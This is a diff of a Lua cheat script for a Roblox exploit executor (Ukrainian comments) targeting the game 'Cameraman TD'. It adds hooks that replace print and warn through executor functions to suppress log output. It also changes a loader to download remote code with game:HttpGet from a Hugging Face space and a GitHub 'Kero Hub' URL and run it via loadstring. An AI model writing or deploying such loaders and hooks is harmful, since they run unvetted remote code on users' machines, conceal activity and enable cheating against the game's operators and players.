@@ -13,6 +13,58 @@
      ============================================================ ]]
 
 -- ============================================================
+-- 0. ПРИДУШЕННЯ СПАМУ В ЛОГАХ (bulk, table: 0x..., nil)
+-- ============================================================
+local function _shouldFilterLog(...)
+    local _cnt = select("#", ...)
+    for _i = 1, _cnt do
+        local _v = select(_i, ...)
+        local _s = tostring(_v):lower()
+        if _s:find("bulk") or _s:find("table:%s*0x") then
+            return true
+        end
+    end
+    local _f = select(1, ...)
+    if _f == nil and _cnt >= 2 then
+        local _sec = tostring(select(2, ...)):lower()
+        if _sec:find("bulk") or _sec:find("table:%s*0x") then
+            return true
+        end
+    end
+    return false
+end
+
+local _oldPrint, _oldWarn = print, warn
+local function _cleanPrint(...)
+    if _shouldFilterLog(...) then return end
+    return _oldPrint(...)
+end
+local function _cleanWarn(...)
+    if _shouldFilterLog(...) then return end
+    return _oldWarn(...)
+end
+
+pcall(function()
+    if hookfunction then
+        if print then hookfunction(print, _cleanPrint) end
+        if warn then hookfunction(warn, _cleanWarn) end
+        local _renv = getrenv and getrenv()
+        if _renv then
+            if _renv.print then hookfunction(_renv.print, _cleanPrint) end
+            if _renv.warn then hookfunction(_renv.warn, _cleanWarn) end
+            _renv.print = _cleanPrint
+            _renv.warn = _cleanWarn
+        end
+    end
+end)
+if getgenv then
+    getgenv().print = _cleanPrint
+    getgenv().warn = _cleanWarn
+end
+_G.print = _cleanPrint
+_G.warn = _cleanWarn
+
+-- ============================================================
 -- 0. AUTO-INJECT СТАБІЛІЗАЦІЯ (КРИТИЧНО ДЛЯ AUTOEXEC)
 -- ============================================================
 if not game:IsLoaded() then
@@ -69,17 +121,22 @@ genv.__CameraTD_ActiveInstance = currentInstanceToken
 -- ЧАСТИНА 1: Завантажувач Kero Hub (Чистий запуск без важких сканувань)
 -- ============================================================
 task.spawn(function()
-    task.wait(1.5)
-    local maxRetries = 3
-    for attempt = 1, maxRetries do
-        local ok, err = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/KeroTwT/Kero-Hub/main/Sources/Cameraman%20TD"))()
+    task.wait(1.2)
+    local hubUrls = {
+        "https://huggingface.co/spaces/kvires/ps99-cloud/raw/main/cameraman_hub.lua",
+        "https://raw.githubusercontent.com/KeroTwT/Kero-Hub/main/Sources/Cameraman%20TD"
+    }
+    for _, url in ipairs(hubUrls) do
+        local ok = pcall(function()
+            local code = game:HttpGet(url)
+            if code and #code > 1000 then
+                loadstring(code)()
+                return true
+            end
+            error("empty code")
         end)
-        if ok then
-            break
-        else
-            task.wait(2.5)
-        end
+        if ok then break end
+        task.wait(1.5)
     end
 end)
 
@@ -209,7 +266,7 @@ task.spawn(function()
                 frameCount = frameCount + 1
                 local now = os.clock()
                 local delta = now - lastTime
-                if delta >= 0.5 then
+                if delta >= 0.15 then
                     local currentFPS = math.clamp(math.round(frameCount / delta), 0, 120)
                     fpsLabel.Text = tostring(currentFPS) .. " FPS"
                     frameCount = 0
